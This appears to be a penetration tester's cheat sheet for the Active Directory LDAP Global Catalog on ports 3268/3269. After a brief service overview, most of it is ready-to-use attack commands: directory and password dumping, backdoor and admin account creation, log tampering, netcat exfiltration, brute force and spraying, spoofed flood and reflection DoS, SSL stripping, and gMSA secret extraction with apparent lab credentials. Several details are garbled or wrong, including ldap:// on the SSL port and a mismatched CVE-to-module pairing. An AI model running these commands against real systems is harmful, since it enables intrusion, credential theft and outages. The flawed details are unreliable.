# Index
- [[Ports, Protocols, and Services]]
	- [[P389 LDAP]]
	- [[P636 LDAPS]]

# Lightweight Directory Access Protocol (LDAP) Global Catalog

- **Port Number:** 3268 (TCP), 3269 (TCP) for SSL
- **Protocol:** TCP
- **Service Name:** LDAP Global Catalog
- **Defined in:** RFC 4511 (LDAP) with Microsoft-specific extensions for Global Catalog

The LDAP (Lightweight Directory Access Protocol) Global Catalog is a specialized service within the Microsoft Active Directory (AD) environment. It is designed to provide a searchable, read-only index of objects within an AD forest, containing a partial replica of all objects in the directory. This catalog is essential for improving the efficiency and performance of directory queries, particularly in large and distributed environments.

## Overview of Features

- **Partial Attribute Set (PAS):** The Global Catalog contains a subset of the attributes for all objects in the directory. This partial attribute set is defined to include the attributes most commonly used in search queries.
  
- **Cross-Domain Search:** The Global Catalog allows for efficient searches across multiple domains within an Active Directory forest. This is particularly useful in environments with multiple domains, as it provides a centralized point for directory searches.

- **High Availability:** Global Catalog servers are typically deployed in a distributed manner across different sites to ensure high availability and resilience.

- **Port Differentiation:** The service operates on two main ports: 3268 for non-encrypted communication and 3269 for SSL-encrypted communication, ensuring that directory data can be securely transmitted if needed.

- **Read-Only Service:** Unlike regular LDAP queries that can modify directory data, the Global Catalog is read-only, which enhances its security and stability.

## Typical Use Cases

- **User Logon:** During user logon, the Global Catalog is queried to retrieve universal group membership information, which is necessary to generate the user’s security token.
  
- **Directory Searches:** Applications and users query the Global Catalog to find objects (e.g., users, computers, printers) across an entire AD forest.

- **Forest-wide Queries:** Administrators use the Global Catalog to perform queries that span multiple domains, which would be inefficient if querying each domain controller individually.

- **Outlook Global Address List (GAL):** Microsoft Outlook and other email clients use the Global Catalog to search for email addresses and user information within the organization.

## How LDAP Global Catalog Works

1. **Query Initialization:**
   - **Step 1:** A client initiates a query to the Global Catalog server by connecting to port 3268 (or 3269 for SSL).
   - **Step 2:** The query is typically a search request that asks for specific attributes of objects within the directory.

2. **Search Operation:**
   - **Step 3:** The Global Catalog server processes the search request, which involves searching the partial attribute set for objects that match the query criteria.
   - **Step 4:** Since the Global Catalog contains a partial replica of all directory objects, it quickly locates and retrieves the necessary information.

3. **Query Response:**
   - **Step 5:** The server compiles the search results and sends them back to the client over the same TCP connection.
   - **Step 6:** If SSL is used (port 3269), the results are encrypted before being transmitted to ensure confidentiality.

4. **Handling Cross-Domain Queries:**
   - **Step 7:** For queries that span multiple domains within the AD forest, the Global Catalog aggregates results from its partial replicas, avoiding the need for the client to query multiple domain controllers.

5. **Universal Group Membership Retrieval:**
   - **Step 8:** During user logon, the client queries the Global Catalog to obtain the user’s universal group memberships, which is then used to generate the security token.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` queries the Global Catalog on `<target_ip>`:3268 for a user’s email address.
- **Server:** `<target_ip>` retrieves the email attribute from the Global Catalog and returns it to `<attack_ip>`.

# Additional Information

## Security Considerations
- **Potential for Information Disclosure:** If improperly secured, the Global Catalog can be a rich source of information for attackers, including user details, email addresses, and group memberships.
  
- **High-Value Target:** Due to the sensitive nature of the data it contains, the Global Catalog is a high-value target in penetration testing and red team engagements.

## Interaction with Active Directory
- **Replication:** The Global Catalog servers participate in Active Directory replication to ensure that their partial replicas are up to date. This replication is critical for maintaining consistency across the forest.
  
- **Site Topology:** Placement of Global Catalog servers is often aligned with AD site topology to optimize performance and reduce inter-site query traffic.

## Modes of Operation
- **Standard Mode (Port 3268):** Non-encrypted communication used for typical directory queries.
  
- **Secure Mode (Port 3269):** SSL-encrypted communication to protect sensitive data during transmission.

## Advanced Usage
- **Cross-Forest Trust Queries:** In environments with cross-forest trusts, the Global Catalog can be queried to find objects in trusted forests, though this typically involves additional configuration and security considerations.

## Configuration Files

The LDAP Global Catalog service is managed as part of the Active Directory Domain Services (AD DS) and does not have standalone configuration files. However, the following files and locations are relevant for managing the service:

1. **Active Directory Database:**
  - **File Location:** `C:\Windows\NTDS\ntds.dit`
  - **Description:** Contains the Active Directory database, including the partial replica stored on Global Catalog servers.

2. **AD Sites and Services Configuration:**
  - **File Location:** Configuration data is stored in AD itself and can be managed through the AD Sites and Services snap-in.
  - **Description:** This configuration determines which domain controllers host the Global Catalog and how replication is managed.

3. **SSL Certificates:**
  - **File Location:** `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys`
  - **Description:** SSL certificates used by the Global Catalog for secure communication (port 3269) are stored here.
- **Example Configuration:**
- **Promoting a Domain Controller to a Global Catalog:**
    ```powershell
    Install-ADDSDomainController -DomainName "example.com" -GlobalCatalog
    ```
  - **Description:** Promotes a domain controller to host the Global Catalog.

## Potential Misconfigurations

1. **Global Catalog Exposure:**
   - **Risk:** If the Global Catalog is exposed to the internet or untrusted networks, it could be used by attackers to gather sensitive information about the AD forest.
   - **Exploitation:** Attackers could perform LDAP enumeration to retrieve user details, email addresses, and group memberships, aiding in further attacks like phishing or privilege escalation.

2. **Insufficient SSL Configuration:**
   - **Risk:** If the Global Catalog is accessible over port 3268 without SSL, data can be intercepted by attackers.
   - **Exploitation:** Man-in-the-middle (MITM) attacks could be used to intercept and manipulate directory queries and responses.

3. **Incomplete Attribute Set:**
   - **Risk:** If critical attributes are not included in the partial attribute set, it could lead to incomplete query results, impacting application functionality.
   - **Exploitation:** This is more of an operational risk, where applications relying on specific attributes may fail to retrieve necessary data, leading to disruptions.

## Default Credentials

The LDAP Global Catalog service does not use specific credentials beyond those required for accessing Active Directory. Authentication is managed through the standard AD authentication mechanisms (Kerberos, NTLM).

# Interaction and Tools

## Tools

### [[LDAPAdd]]
- **Add Entry to the LDAP directory:** Add a new entry defined in the `new_entry.ldif` file.
	```bash
	ldapadd -H ldap://<target_ip>:3269 -D "<bind_dn>" -w '<password>' -f <filename>
	
	ldapadd -H ldap://<target_ip>:3269 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' -f new_entry.ldif
	```

### [[LDAPModify]]
- **Modify Entry in the LDAP directory:** Modify an existing entry using the `modify_entry.ldif` file.
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "<bind_dn" -w '<password>' -f <filename>
	
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' -f modify.ldif
	```

### [[LDAPDelete]]
- **Delete Entry from the LDAP directory:** Delete the entry with the common name "John Doe."
	```bash
	ldapdelete -H ldap://<target_ip>:3269 -D "<bind_dn>" -w '<password>' "<entry_to_delete>"
	
	ldapdelete -H ldap://<target_ip>:3269 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' "CN=user,DC=mydomain,DC=com"
	```

### [[LDAPSearch]]
- **Anonymous Bind:** Attempts to enumerate the directory with an anonymous bind.
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "<searchbase_ou>"
	ldapsearch -H ldap://<target_ip>:3269 -b "DC=mydomain,DC=com" 
	```
- **Authenticated Bind:** Performs enumeration with authenticated access.
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -D '<domainname>\<username>' -w '<password>'
	ldapsearch -H ldap://<target_ip>:3269 -D 'mydomain\admin' -w 'password123'
	
	ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>'
	ldapsearch -H ldap://<target_ip>:3269 -D "CN=admin,DC=mydomain,DC=com" -w 'password123'
	```
- **Search Syntax:**
	```sqlash
	ldapsearch -H ldap://<target_ip>:3269 -D '<domainname>\<username>' -w '<password>' -b "<searchbase_ou>" "<search_parameters>"
	
	ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>'
	```
- **Search Entries:** Searches for all entries under the base DN `DC=mydomain,DC=com`.
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "DC=mydomain,DC=com" "(objectClass=*)"
	```
- **Extract Users:**
	```bash	
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Users,DC=mydomain,DC=com"
	```
- **Extract Specific User:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Users,DC=mydomain,DC=com" "(uid=johndoe)"
	```
- **Extract Users in an Organizational Unit:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "OU=Users,DC=mydomain,DC=com" "(objectClass=inetOrgPerson)"
	```
- **Extract Computers:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Computers,DC=mydomain,DC=com"
	```
- **Extract my info:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=<username>,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Domain Admins:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Domain Admins,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Domain Users:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Domain Users,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Enterprise Admins:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Enterprise Admins,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Administrators:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Administrators,CN=Builtin,DC=mydomain,DC=com"
	```
- **Extract Remote Desktop Group:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "CN=Remote Desktop Users,CN=Builtin,DC=mydomain,DC=com"
	```
- **To see if you have access to any password you can use grep after executing one of the queries:**
	```bash
	<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
	```
- **Retrieve specific attributes:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -b "DC=mydomain,DC=com" "(uid=johndoe)" cn mail
	```
- **Export Directory Entries:** Exports the entire directory subtree to an LDIF file over a secure LDAPS connection.
	```bash
	ldapsearch -H ldaps://<target_ip> -b "dc=mydomain,dc=com" > backup.ldif	
	```
- **StartTLS:** Performs an LDAP search over a StartTLS-encrypted connection.
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -ZZ -b "DC=mydomain,DC=com"
	```

### [[LDAPPasswd]]
- **Password Change over LDAPS:** Changes the password of an LDAP user over a secure LDAPS connection.
    ```bash
    ldappasswd -H ldap://<target_ip>:3269 -D '<domainname>\<username>' -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
    
    ldappasswd -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
    ```

### [[SlapPasswd]]
- **LDAP Password Hashing:** Generates a hashed password for secure storage in LDAP entries.
    ```bash
    slappasswd
    ```

### [[SlapCat]]
- **Exporting LDAP Entries:** Exports all entries in the LDAP directory to an LDIF file for backup purposes.
    ```bash
    slapcat -v -l backup.ldif
    ```

### [[SlapAdd]]
- **Importing LDAP Entries:** Imports entries from an LDIF file into the LDAP directory.
    ```bash
    slapadd -l backup.ldif
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 3269"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 3269
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 3269
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 3269 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 3269
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 3269 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:3269
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 3269 -c 1
    ```

### [[CrackMapExec]]
- **Authentication:** Testing if account exist without Kerberos protocol
	```bash
	crackmapexec ldap <target_ip> -u <username_wordlist> -p '' -k
	```
- **Testing credentials:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>'
	crackmapexec ldap <target_ip> -u <username> -H '<ntlmhash>'
	```
- **Find Domain SID:**
	```bash
	crackmapexec ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
	
	LDAP        DC1.scrm.local  3269    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
	LDAPS       DC1.scrm.local  3269    DC1.scrm.local   [+] scrm.local\sqlsvc
	LDAPS       DC1.scrm.local  3269    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200
	```
- **Unconstrained Delegation:** CrackMapExec allows you to retrieve the list of all computers et users with the flag TRUSTED_FOR_DELEGATION
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --trusted-for-delegation
	```
- **Admin Count:** adminCount Indicates that a given object has had its ACLs changed to a more secure value by the system because it was a member of one of the administrative groups (directly or transitively).
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --admin-count
	```
- **Machine Account Quota:** This module retrieves the MachineAccountQuota domain-level attribute. It's useful to check this value because by default it permits unprivileged users to attach up to 10 computers to an Active Directory (AD) domain.
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M maq
	```
- **Get user descriptions:** New LDAP module to look for password inside the user's description.
	- Three options are available:
		- FILTER: To look for a string inside the description
		- PASSWORDPOLICY: To look for password according to the complexity requirements of windows
		- MINLENGTH: Choose the minimum length of the password (may be obtained from `--pass-pol`)
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --kdchost <ip> -M get-desc-users
	```
- **Dump gMSA:** Extract gmsa credentials accounts. Using the protocol LDAP you can extract the password of a gMSA account if you have the right. LDAPS is required to retrieve the password, using the `--gmsa` LDAPS is automatically selected
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa
	```
- **Exploit ESC8 (adcs) List all PKI enrollment Server:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M adcs
	```
- **Exploit ESC8 (adcs) List all certificates inside a PKI:** 
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M adcs -o SERVER=xxxx
	```
- **Extract subnet:** Extract subnet over an active directory environment
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network -o ONLY_HOSTS=true
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network -o ALL=true
	```
- **Check LDAP signing:** Using the module `ldap-checker` you can verify if ldap require channel binding or not
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M ldap-checker
	```
- **Read DACL right:** LDAP module that permits to read and export the DACLs of one or multiple objects! Read all the ACEs of the Administrator
	```bash
	crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
	```
- **Extract gMSA secrets:** Convert gSAM id, convert gmsa lsa to ntlm. CrackMapExec offers multiple choices when you find a gmsa account in the LSA
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
	```

	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
	```
- **Bloodhound Ingestor:** To ingest the data of the Active Directory
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --bloodhound --ns ip --collection All
	```

### [[BloodHound Cheat Sheet]]
- **Extract All:** Collect and visualize data from the Global Catalog to identify potential privilege escalation paths.
    ```powershell
    SharpHound -CollectionMethod All -LDAPOnly -DomainFQDN example.com
    ```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:3269
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:3269
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 3269
	```

## Other Techniques

### [[JXplorer]]
- **Open JXplorer:** Allows for graphical interaction with LDAP directories, making it easier to browse and modify entries.
    ```bash
    jxplorer
    ```

### [[LDAPAdmin]]
- **Connecting to an LDAP Server:**
	1. Open LDAPAdmin.
	2. Go to `Connection > Connect`.
	3. Enter the server address, port (389), and select SSL.
	4. Enter the bind DN (e.g., `CN=admin,DC=mydomain,DC=com`) and password.
	5. Click `Connect`.
- **Browsing the Directory:**
	1. Expand the directory tree to browse organizational units and entries.
	2. Right-click on entries to view, modify, or delete them.
	3. Use the `Search` feature to find specific entries.

### [[LDP.exe]]
- **Connecting to an LDAP Server:**
	1. Open `LDP.exe`.
	2. Connect to the server: `Connection -> Connect...`
	    - Server: `yourdomaincontroller`
	    - Port: `3269`
	    - Check `SSL` for secure connection.
	3. Bind to the server: `Connection -> Bind...`
	    - Use a valid domain user credentials.

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 3269
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 3269
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### LDAP Anonymous Bind 
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -b ""
    ```
- **Description:** Attempt to authenticate to the LDAP server via anonymous bind.

### LDAP Injection
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(&(uid=*)(userPassword=*))"
    ```
- **Description:** Injects a malicious LDAP filter to try and extract sensitive information.

## Persistence

### Create User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_new_user.ldif
	```
- **Description:** Create a new user to the directory providing a backdoor for persistent access.

### Change Existing User Account Password
- **Tool:** [[LDAPPasswd]]
	```bash
	ldappasswd -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
	```
- **Description:** Modify an existing user account password for persistent access.

### Manipulate Existing User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f modify_user.ldif
	```
- **Description:** Modify existing user entries to create alternate access methods.

### Injecting Malicious Entries
- **Tool:** [[LDAPModify]]
    ```bash
    ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f malicious.ldif
    ```
- **Description:** Injecting persistent backdoor entries into the LDAP directory.

## Credential Harvesting

### Packet Capture
  - **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 3269"
    ```
  - **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### LDAP Credential Harvesting
  - **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(uid=*)"
    ```
  - **Description:** Attempts to enumerate user credentials from the LDAP directory.

### Password Dumping
  - **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(objectClass=person)" userPassword
    ```
  - **Description:** Dumps all user passwords stored in the LDAP directory.

### LDAPS Log Analysis
- **Tool:** Log Parsing Tools
	```bash
	grep -i "ldap" /var/log/auth.log
	```
- **Description:** Analyze logs for failed LDAPS authentication attempts, which might reveal usernames or other useful information.

## Privilege Escalation

### Create Admin Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_new_admin.ldif
	```
- **Description:** Create a new admin account to the directory providing a backdoor for privilege escalation.

### Change Existing Admin Account Password
- **Tool:** [[LDAPPasswd]]
	```bash
	ldappasswd -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
	```
- **Description:** Modify an existing admin account password for privilege escalation.

### Manipulate Existing User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f escalate_user.ldif
	```
- **Description:** Modify existing user entries to escalate privileges of a lower-privileged account.

## Internal Reconnaissance

### LDAP Enumeration
  - **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(objectClass=*)"
    ```
  - **Description:** Enumerating directory objects, groups, and permissions to map out internal network resources.

### Sudo Rules Enumeration
- **Tool:** [[LDAPSearch]]
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "ou=sudoers,dc=example,dc=com"
	``` 
- **Description:** Retrieve and analyze sudo rules stored in the directory to identify potential privilege escalation vectors.

### Identifying High-Value Targets
- **Tool:** [[BloodHound Cheat Sheet]]
    ```powershell
    SharpHound -CollectionMethod All -LDAPOnly -DomainFQDN example.com
    ```
- **Description:** Use BloodHound to map AD relationships and identify potential paths to escalate privileges within the environment.

## Lateral Movement, Pivoting, and Tunnelling

### Using LDAP for Lateral Movement
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_service_account.ldif
	```
- **Description:** Adds a service account with privileges across multiple systems, facilitating lateral movement.

## Defense Evasion

### Using Obfuscated Queries
- **Tool:** [[LDAPSearch]]
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "dc=example,dc=com" -LLL "(|(cn=*)(uid=*))"
	```
- **Description:** Use obfuscated LDAP queries to avoid detection by security monitoring tools.

### Modifying Logs via LDAP
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f modify_logs.ldif
	```
- **Description:** Modifies or deletes LDAP logs to erase evidence of an attack or compromise.

## Data Exfiltration

### Exfiltrating Directory Data
  - **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" -LLL > exfil_data.ldif
    ```
  - **Description:** Extracting sensitive directory data over a secure LDAPS connection.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
  - **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ldap://<target_ip> -s 3269 -l <username> -P <password_list>
    ```
  - **Description:** Test a single username against multiple passwords.

### Password Spray
  - **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ldap://<target_ip> -s 3269 -l <username_list> -P <password>
    ```
  - **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
  - **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
  - **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
  - **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
  - **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### LDAP Query Flood
  - **Tool:** [[LDAPSearch]]
    ```bash
    while true; do ldapsearch -H ldap://<target_ip>:3269 -b "DC=mydomain,DC=com" "(uid=*)"; done
    ```
  - **Description:** Floods the LDAP server with queries, consuming resources and potentially causing a denial of service.

## Exploits 

### CVE-2017-8563 (LDAP Relay Attack)
- **Tool:** [[Metasploit]]
	```bash
	use auxiliary/scanner/ldap/ldap_login
	```
- **Description:** Exploits a vulnerability in Microsoft LDAP to perform relay attacks and gain unauthorized access.

### LDAP Injection
  - **Tool:** [[Custom Scripts]]
    ```bash
    ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(&(uid=*)(userPassword=*))"
    ```
- **Example:**
	```bash
	ldapsearch -H ldap://<target_ip>:3269 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' "(uid=$USER_INPUT)"
	```
- **Malicious Input:** This input modifies the query to return all objects, bypassing the intended filter.
	```bash
	` `*)(|(objectClass=*))` `
	```
- **Description:** Exploits poorly sanitized input in LDAP queries to extract sensitive information. By injecting malicious LDAP statements, attackers can alter the intended query logic and gain unauthorized access to directory data.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 4511|https://tools.ietf.org/html/rfc4511|
|Microsoft Active Directory Documentation|https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/|
|Ldapsearch Tool Documentation|https://linux.die.net/man/1/ldapsearch|
|PowerShell AD Module|https://docs.microsoft.com/en-us/powershell/module/activedirectory/|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|BloodHound Documentation|https://bloodhound.readthedocs.io/en/latest/|
|Impacket Documentation|https://github.com/SecureAuthCorp/impacket|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|
|LDAP3 Python Library|https://ldap3.readthedocs.io/en/latest/|
|Microsoft Technet: LDAP Queries|https://docs.microsoft.com/en-us/windows/win32/adsi/searching-with-ldap-queries|